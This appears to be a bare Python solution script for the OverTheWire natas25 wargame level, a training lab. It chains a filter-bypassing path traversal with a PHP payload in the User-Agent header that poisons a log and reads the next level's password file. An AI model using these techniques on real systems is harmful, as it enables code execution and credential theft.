import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas25.natas.labs.overthewire.org/index.php'
auth = HTTPBasicAuth('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

payload = '''<?php echo "OK GOOGLE"; include("/etc/natas_webpass/natas26");?>'''

r = requests.get(HOST, auth=auth)
sid = r.cookies['PHPSESSID']
cookies = dict(PHPSESSID=sid)
params = dict(lang='....//....//....//....//....//....//....//tmp/natas25_{0}.log'.format(sid))
headers = {'user-agent': payload}
r = requests.get(HOST, params=params, auth=auth, headers=headers, cookies=cookies)

print r.content.split('OK GOOGLE')[1].split()[0]





